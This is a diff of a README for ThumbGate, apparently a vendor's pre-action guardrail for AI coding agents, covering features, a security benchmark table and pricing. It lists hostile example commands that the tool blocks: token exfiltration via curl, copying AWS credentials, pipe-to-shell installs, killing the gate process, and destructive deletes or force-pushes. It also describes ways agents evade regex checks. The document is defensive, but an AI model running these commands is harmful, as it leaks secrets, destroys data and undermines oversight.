@@ -32,46 +32,39 @@
 
 ## What it does
 
-ThumbGate is the local-first **Pre-Action Checks** engine for AI coding agents. It runs in the PreToolUse hook to evaluate the proposed tool call before execution — so costly mistakes can be caught before they happen.
+ThumbGate is the local-first **Pre-Action Checks** engine (`<0.5ms` `PreToolUse` firewall) for AI coding agents. It runs in the PreToolUse hook to evaluate the proposed tool call before execution — catching costly secret leaks, destructive infrastructure commands, and repeated agent mistakes before they happen.
 
-ThumbGate GitHub star growth is measured with GitHub's privacy-safe [`GET /repos/{owner}/{repo}/stargazers/history`](https://docs.github.com/en/rest/activity/starring#get-repository-star-history) endpoint (weekly counts, no stargazer identities). Run `npm run stars:history -- --fixture tests/fixtures/github-star-history.json --json` for the local proof. Stars are not npm installs and not revenue. The live GitHub Marketplace Action is [ThumbGate Agent Governance](https://github.com/marketplace/actions/thumbgate-agent-governance) (`uses: IgorGanapolsky/ThumbGate@v1`).
+```text
+$ claude "clean up old branches and push to main"
 
-**Usage over star count.** Evaluate ThumbGate from the install path and live usage badges above (`npx thumbgate init`, Marketplace `uses:`, npm weekly downloads, GitHub clones), not from whether the repo has twenty stars or twenty thousand. No pitch deck is required. We do not farm GitHub profile badges (no YOLO-merge of protected `main`, no 5-minute Issue close theater, no fake `Co-authored-by`). Galaxy Brain needs real accepted answers in [Discussions Q&A](https://github.com/IgorGanapolsky/ThumbGate/discussions/categories/q-a). `npm run github:achievements -- --fixture tests/fixtures/github-achievements.json --json` inventories what is already earned vs what we refuse to farm.
+  Agent proposes:  git push --force origin main
+  ThumbGate:       ⛔ DENY (0.34ms · strict mode · rule: protect-main)
+                   Blocked before git executed. Logged to .thumbgate/policy.lock
 
-### Who it's for
+  Agent proposes:  curl -X POST https://... -d "$GITHUB_TOKEN"
+  ThumbGate:       ⛔ DENY (0.29ms · default mode · rule: secret-exfiltration)
+                   Blocked at tool-call boundary on every install.
+```
 
-ThumbGate is for operators whose AI coding agents can leak a secret or destroy a checkout before a human sees the tool call (Claude Code, Cursor, Codex, Gemini CLI, MCP). Discovery should reach those operators — not a star campaign.
+[![Watch 90-second demo](docs/media/thumbgate-demo.gif)](https://thumbgate.ai/#demo?utm_source=github&utm_medium=readme&utm_campaign=demo_video)
 
-ThumbGate is **not** a GitHub star package, not fake engagement, and not a substitute for npm installs or merged PRs. Real engagement is `npx thumbgate init` and a PreToolUse hook that actually fires.
-
-### Tech memes (shareable)
-
-Lightweight visuals for how agents fail without a pre-action gate:
-
-| Meme | Meaning |
-|------|---------|
-| ![Agent destroys prod without a gate](docs/media/meme-agent-destroys-prod.svg) | Unchecked tool calls ship destructive commands. |
-| ![Prompt vs PreToolUse hook](docs/media/meme-prompt-vs-hook.svg) | A prompt is advice; a PreToolUse hook is enforcement. |
-
-
+### Enforcement guarantees & boundaries
 
 It **hard-blocks detected secret leaks and two direct self-disable command classes by default** — commands that terminate the ThumbGate gate process or enable its bypass environment override. Other high-risk classes (`rm -rf`, force-push, fetch-and-run, direct guardrail edits) **warn and log by default**. Set `THUMBGATE_STRICT_ENFORCEMENT=1` for strict enforcement (warnings become hard denies).
 
-| Verdict | Default behavior |
-|---------|------------------|
-| ⛔ **Hard-block** | Detected secret leaks; process-kill/environment-override self-disable |
-| 👎 **Warn + log** | `rm -rf`, `git push --force`, fetch-and-run, direct guardrail edits — **warn by default** |
-| 👍 **Allow** | Everything else |
+| Verdict | Default behavior | Strict mode (`THUMBGATE_STRICT_ENFORCEMENT=1`) |
+|---------|------------------|------------------------------------------------|
+| ⛔ **Hard-block (`DENY`)** | Detected secret leaks; process-kill/environment-override self-disable | All matched destructive, force-push, infra, and promoted rules |
+| 👎 **Warn + log (`WARN`)** | `rm -rf`, `git push --force`, fetch-and-run, direct guardrail edits — **warn by default** | Promoted to `⛔ DENY` before tool execution |
+| 👍 **Allow (`ALLOW`)** | Safe tool calls (`<0.5ms` pass-through) | Safe tool calls (`<0.5ms` pass-through) |
 
 **Accepted feedback is stored as local lessons.** Repeated concrete failures can become prevention rules that promote from warnings to blocking gates. The firewall improves from operations without retraining the model. Prompt evaluation (`npx thumbgate eval`) turns accepted feedback into reusable eval cases and local proof reports.
 
-**Honest disclaimer:** ThumbGate does not update model weights. It intercepts tool calls at runtime. Local-first — no cloud required for the enforcement path.
+**Honest disclaimer:** ThumbGate does not update model weights and is not a full OS/network container sandbox — it enforces deterministic policy at the tool-call boundary (`PreToolUse`) and complements OS/container sandboxes pre-flight. Local-first — no cloud required for the enforcement path.
 
 Works with **Claude Code, Cursor, Codex, Gemini CLI, Amp, Cline, OpenCode**, and other MCP agents.
 
-[![AI Agent without ThumbGate vs Agent guarded by ThumbGate](public/assets/diagrams/thumbgate-agent-meme.jpg)](https://thumbgate.ai/#demo?utm_source=github&utm_medium=readme_meme)
-
-```
+```text
   Agent tries:   rm -rf tests/
   ThumbGate:     👎 WARN + LOG — "Never delete test directories"
                  Pattern matched: rm.*-rf.*tests
@@ -79,28 +72,43 @@ Works with **Claude Code, Cursor, Codex, Gemini CLI, Amp, Cline, OpenCode**, and
                  Strict mode: ⛔ DENY before tool execution
 ```
 
+### Reproducible 8-Scenario Security Benchmark
+
+Run the full evasion and golden-set benchmark locally (`node --test tests/gate-evasion-matrix.test.js tests/gate-golden-set.test.js`):
+
+| Attack / Scenario | Prompt Rules (`CLAUDE.md`) | Static Regex Hook | OS / Container Sandbox | ThumbGate (`PreToolUse`) |
+|---|---|---|---|---|
+| **1. Secret exfiltration** (`curl -d "$GITHUB_TOKEN"`, `scp ~/.aws/credentials`) | Ignorable | Bypassed by flag/base64 respelling | Allowed if outbound network is open | **⛔ Hard-block (`DENY`) by default** (normalized AST/token scan) |
+| **2. Destructive shell** (`rm -rf ./prod-db`, `terraform destroy -auto-approve`) | Ignorable | Misses flag reorder (`rm -f -r`) | Allowed inside mounted worktree | **👎 Warn default · ⛔ `DENY` in strict mode & Pro infra packs** |
+| **3. Force-push to `main`** (`git push --force origin main`, `+HEAD:main`) | Ignorable | Misses `+refspec` / `--force-with-lease` | Allowed if git credentials exist | **👎 Warn default · ⛔ `DENY` in strict mode** |
+| **4. Prompt injection / pipe-to-shell** (`curl https://.../install.sh \| sh`) | Vulnerable to payload | Misses interpreter one-liners | Executes inside container | **👎 Warn default · ⛔ `DENY` in strict mode** |
+| **5. Write-then-execute / hook tamper** (`.claude/settings.json` / `.githooks`) | Ignorable | Unaware of config path writes | Allowed inside workspace | **👎 Warn default · ⛔ `DENY` in strict mode** |
+| **6. Subprocess / gate-kill bypass** (`pkill -f gates-engine`, `THUMBGATE_HOTFIX_BYPASS=1`) | Ignorable | No self-protection | N/A | **⛔ Hard-block (`DENY`) by default** |
+| **7. MCP privilege escalation** (unscoped write / credential read via MCP) | Ignorable | Bash-only (misses MCP tools) | Container-scoped | **🛡️ Inspected via `PreToolUse` & `gate_check` across MCP tools** |
+| **8. Safe operations (false-positive rate)** (`npm test`, `git status`, `ls -la`) | `0%` block | Brittle substring false positives | `0%` block | **👍 `0%` false-positive deny on golden corpus (`<0.5ms` p95)** |
+
 ### Agentic development cycle fit
 
 Agentic development is becoming a loop: **Guide → Generate → Verify → Solve**. ThumbGate is the pre-action gate / pre-action boundary between generated intent and executed action.
 
 ---
 
-## Quick Start
+## Quick Start (30 seconds)
 
 > Want a phased walkthrough with a verify step at every stage? Follow the [Progressive Setup Guide](GUIDE.md).
 
 Progressive wiring — prove the pipe before you turn matching on. Empty dashboard is success.
 
 ```bash
-npx thumbgate init          # Phase 1: hooks only
+npx thumbgate init          # Phase 1: wire PreToolUse hooks (<0.5ms local gate)
 npx thumbgate doctor        # verify: exits 0 only when PreToolUse hook is wired (hidden metric = hook install, not gate count)
-npx thumbgate dashboard --open  # Phase 2: open local HTML; empty stats are OK
+npx thumbgate dashboard --open  # Phase 2: open local visual debugger; empty stats are OK
 npx thumbgate capture --feedback=down --context="Never run DROP on production tables" --what-went-wrong="agent proposed DROP" --what-to-change="require review for DROP"
 ```
 
 Later `DROP` attempts in the same scope surface the check:
 
-```
+```text
 ⚠️ Check fired: "Never run DROP on production tables"
    Pattern: DROP.*production
    Verdict: 👎 WARN + LOG   (⛔ BLOCK when THUMBGATE_STRICT_ENFORCEMENT=1)
@@ -118,8 +126,6 @@ npx -y thumbgate serve
 
 - Equivalent: `npx -y thumbgate mcp`
 - Do **not** use `npm start` for MCP — that launches the hosted HTTP API (`src/api/server.js`), not the agent-facing stdio server.
-
-[**▶ 90-second demo**](https://thumbgate.ai/#demo?utm_source=github&utm_medium=readme&utm_campaign=demo_video) · [GIF walkthrough](docs/media/thumbgate-demo.gif)
 
 ---
 
@@ -172,13 +178,16 @@ Spec-driven agent frameworks like **GSD** (get-shit-done) and **GitHub Spec Kit*
 
 ## Pricing & buyer paths
 
-Free tier: **2 feedback captures/day (10 total)** and **up to 3 active auto-promoted prevention rules**. Pro ($19/mo or $149/yr) is the individual tier for unlimited rules, history-aware lessons, linked feedback session flow, personal dashboard, and DPO export. **Enterprise is custom and scoped after intake**; hosted team lesson sync and a hosted org dashboard are not general availability.
+Free tier (MIT): **2 feedback captures/day (10 total)** and **up to 3 active auto-promoted prevention rules**. **Pro ($19/mo or $149/yr)** is the self-serve tier for individual developers and repositories: unlimited active gates, **6 production infrastructure rule packs (`AWS`, `Terraform`, `Kubernetes`, `Stripe`, `Supabase`, `Git`)**, **repo-committed policy lock (`.thumbgate/policy.lock`)**, visual gate debugger (`npx thumbgate dashboard --open`), cross-session recall, and DPO export. **Setup Sprint ($499 one-time)** is a done-with-you implementation for one supported workflow (60-minute review + failure map, configured local + GitHub Action CI gate + regression test, and 2-day rollout/rollback proof or full refund). **Enterprise is custom and scoped after intake**; hosted team lesson sync and a hosted org dashboard are not general availability.
 
-| | Free | Pro ($19/mo or $149/yr) | Enterprise |
+| | Free (MIT) | Pro ($19/mo or $149/yr) | Enterprise & Setup Sprint ($499 one-time) |
 |---|---|---|---|
-| Local CLI + PreToolUse | ✅ | ✅ | Scoped after intake |
-| Feedback captures | 2 feedback captures/day (10 total) | Unlimited | Scoped after intake |
-| Active auto-promoted rules | up to 3 active auto-promoted prevention rules | Unlimited | Scoped after intake |
+| Local `<0.5ms` `PreToolUse` CLI + MCP | ✅ | ✅ | ✅ Custom wired for 1 workflow ($499) / Scoped after intake |
+| Default secret-exfiltration & gate-bypass hard deny | ✅ | ✅ | ✅ |
+| Feedback captures | 2 feedback captures/day (10 total) | Unlimited | Configured for workflow ($499) / Scoped after intake |
+| Active auto-promoted rules | up to 3 active auto-promoted prevention rules | Unlimited active gates | 1 managed workflow gate + CI check ($499) / Scoped after intake |
+| Production infra rule packs (`AWS`, `Terraform`, `K8s`, `Stripe`, `Supabase`, `Git`) | — | ✅ All 6 packs included | ✅ Tailored to 1 workflow ($499) |
+| Repo-committed policy lock (`.thumbgate/policy.lock`) | Local machine only | ✅ Repo policy lock | ✅ Wired in repo + GitHub Action ($499) |
 | Personal dashboard + DPO export | — | ✅ | Reviewed during intake |
 | Hosted team lesson sync | — | — | Not general availability |
 | Hosted org dashboard | — | — | Not general availability |
@@ -189,11 +198,33 @@ Free tier: **2 feedback captures/day (10 total)** and **up to 3 active auto-prom
 
 **First-dollar activation path:** open the [ThumbGate GPT](https://thumbgate.ai/go/gpt?utm_source=github&utm_medium=readme), paste the risky action, capture typed feedback (`thumbs down:` / `thumbs up:`). **Native ChatGPT rating buttons are not the ThumbGate capture path.** Ask: **what repeated AI mistake would be worth catching before the tool executes?**
 
-**Paid path for individual operators:** [ThumbGate Pro](https://thumbgate.ai/checkout/pro?utm_source=github&utm_medium=readme&utm_campaign=pro_page) is the self-serve side lane for a personal dashboard and export-ready evidence.
+**Paid path for individual operators:** [ThumbGate Pro](https://thumbgate.ai/checkout/pro?utm_source=github&utm_medium=readme&utm_campaign=pro_page) is the self-serve side lane for production rule packs, `.thumbgate/policy.lock`, a personal dashboard, and export-ready evidence.
 
 [**Start free**](https://thumbgate.ai/?utm_source=github&utm_medium=readme) · [**Pro $19/mo**](https://thumbgate.ai/checkout/pro?utm_source=github&utm_medium=readme) · [**Live Dashboard**](https://thumbgate.ai/dashboard?utm_source=github&utm_medium=readme) · [**Team Sprint intake**](https://thumbgate.ai/?utm_source=github&utm_medium=readme#workflow-sprint-intake) · [**Workflow Hardening Sprint**](https://thumbgate.ai/?utm_source=github&utm_medium=readme&utm_campaign=top_cta#workflow-sprint-intake) · [**First Dollar Playbook**](docs/FIRST_DOLLAR_PLAYBOOK.md)
 
+<details>
+<summary><b>Popular buyer questions &amp; operational guides</b></summary>
+
 **Popular buyer questions:** **[AI search topical presence](https://thumbgate.ai/guides/ai-search-topical-presence?utm_source=github&utm_medium=readme&utm_campaign=buyer_questions)** · **[Relational knowledge and AI recommendations](https://thumbgate.ai/guides/relational-knowledge-ai-recommendations?utm_source=github&utm_medium=readme&utm_campaign=buyer_questions)** · **[AI Mode ads for agent governance](https://thumbgate.ai/guides/ai-mode-ads-agent-governance?utm_source=github&utm_medium=readme&utm_campaign=buyer_questions)** · **[MCP tool governance](https://thumbgate.ai/guides/mcp-tool-governance?utm_source=github&utm_medium=readme&utm_campaign=buyer_questions)** · **[AI agent pre-action approval gates](https://thumbgate.ai/guides/ai-agent-pre-action-approval-gates?utm_source=github&utm_medium=readme&utm_campaign=buyer_questions)** · **[Background agent governance](https://thumbgate.ai/guides/background-agent-governance?utm_source=github&utm_medium=readme&utm_campaign=buyer_questions)** · **[GPT-5.5 model evaluation](https://thumbgate.ai/guides/gpt-5-5-model-evaluation?utm_source=github&utm_medium=readme&utm_campaign=buyer_questions)** · **[Stop repeated AI agent mistakes](https://thumbgate.ai/guides/stop-repeated-ai-agent-mistakes?utm_source=github&utm_medium=readme&utm_campaign=buyer_questions)** · **[Browser automation safety](https://thumbgate.ai/guides/browser-automation-safety?utm_source=github&utm_medium=readme&utm_campaign=buyer_questions)** · **[Native messaging host security](https://thumbgate.ai/guides/native-messaging-host-security?utm_source=github&utm_medium=readme&utm_campaign=buyer_questions)** · **[Autoresearch agent safety](https://thumbgate.ai/guides/autoresearch-agent-safety?utm_source=github&utm_medium=readme&utm_campaign=buyer_questions)** · **[Cursor guardrails](https://thumbgate.ai/guides/cursor-agent-guardrails?utm_source=github&utm_medium=readme&utm_campaign=buyer_questions)** · **[Codex CLI guardrails](https://thumbgate.ai/guides/codex-cli-guardrails?utm_source=github&utm_medium=readme&utm_campaign=buyer_questions)** · **[Gemini CLI memory + enforcement](https://thumbgate.ai/guides/gemini-cli-feedback-memory?utm_source=github&utm_medium=readme&utm_campaign=buyer_questions)** · **[Google Cloud MCP guardrails](https://thumbgate.ai/guides/gcp-mcp-guardrails?utm_source=github&utm_medium=readme&utm_campaign=buyer_questions)** · **[Roo Code alternative: migrate to Cline](https://thumbgate.ai/guides/roo-code-alternative-cline?utm_source=github&utm_medium=readme&utm_campaign=buyer_questions)**
+
+</details>
+
+<details>
+<summary><b>Who it's for &amp; telemetry verification</b></summary>
+
+### Who it's for
+
+ThumbGate is for operators whose AI coding agents can leak a secret or destroy a checkout before a human sees the tool call (Claude Code, Cursor, Codex, Gemini CLI, MCP). The live GitHub Marketplace Action is [ThumbGate Agent Governance](https://github.com/marketplace/actions/thumbgate-agent-governance) (`uses: IgorGanapolsky/ThumbGate@v1`).
+
+**Usage over star count.** Evaluate ThumbGate from the install path and live usage (`npx thumbgate init`, Marketplace `uses:`, npm weekly downloads, GitHub clones). No pitch deck is required. Stars are not npm installs and not revenue; ThumbGate is not a GitHub star package and not fake engagement. We do not farm GitHub profile badges (`stargazers/history` and `npm run github:achievements` verify repository telemetry locally).
+
+| Visual | Meaning |
+|------|---------|
+| ![Agent destroys prod without a gate](docs/media/meme-agent-destroys-prod.svg) | Unchecked tool calls ship destructive commands. |
+| ![Prompt vs PreToolUse hook](docs/media/meme-prompt-vs-hook.svg) | A prompt is advice; a PreToolUse hook is enforcement. |
+| ![AI Agent without ThumbGate vs Agent guarded by ThumbGate](public/assets/diagrams/thumbgate-agent-meme.jpg) | Runtime interception before execution. |
+
+</details>
 
 ---
 
